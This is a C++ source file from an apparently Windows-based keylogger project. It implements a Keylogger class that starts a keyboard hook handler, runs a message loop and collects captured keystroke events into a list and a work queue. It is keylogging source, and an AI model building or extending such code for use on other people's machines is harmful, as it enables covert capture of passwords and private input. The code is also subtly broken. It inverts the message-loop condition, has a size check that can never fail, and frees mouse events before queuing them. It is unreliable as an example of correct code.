/**
* Project Keylogger
*/

#include "keylogger_dll/Keylogger.h"

/**
* Keylogger implementation
*/
Keylogger::Keylogger(WorkQueue& wqueue) : _eventManager(*(new EventManager(*this))), _hookHandler(*(new HookHandler(_eventManager))), IKeylogger(), _levents(wqueue) {
	_running = false;
}

Keylogger::~Keylogger()
{
	if (_running)
	{
		if (!this->stop())
		{
			std::cout << "Stop error." << std::endl;
		}
	}
	for (AEvent* event : _events)
	{
		delete event;
	}
	_events.clear();
	system("Pause");
}


/**
* @return bool
*/
bool Keylogger::init() {
	_events.clear();
	if (!_hookHandler.init())
		return false;
	return true;
}

/**
* @return void
*/
bool Keylogger::run() {
	MSG msg;
	_running = true;
	while (!PeekMessage(&msg, NULL, 0, 0, 0) && _running)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return true;
}

/**
* @return bool
*/
bool Keylogger::stop() {
	_running = false;
	return _hookHandler.stop();
}

/**
* @return bool
*/
bool Keylogger::kill() {
	return false;
}

/**
* @param AEvent*
* @return bool
*/
bool Keylogger::pushToQueue(const AEvent* event) {
	int size = _events.size();
	if (!event->isMouse())
	{
		_events.push_back(const_cast<AEvent*>(event));
		if (_events.size() == size)
		{
			return false;
		}
		if (event->getVirtualKeyCode() == VK_ESCAPE)
			_running = false;
	}
	if (event->isMouse())
	{
		//	((MouseEvent*)(event))->describe();
		delete event;
	}
	//else
	//{
	//	((KeyboardEvent*)(event))->describe();
	//	if (event->getVirtualKeyCode() == VK_ESCAPE)
	//	{
	//		std::cout << "VK_ESCAPE=" << VK_ESCAPE << std::endl;
	//		this->stop();
	//	}
	//}
	this->_levents.add_elem((void*)event);
	return true;
}

std::vector<AEvent*>		Keylogger::getEvents() const
{
	return _events;
}
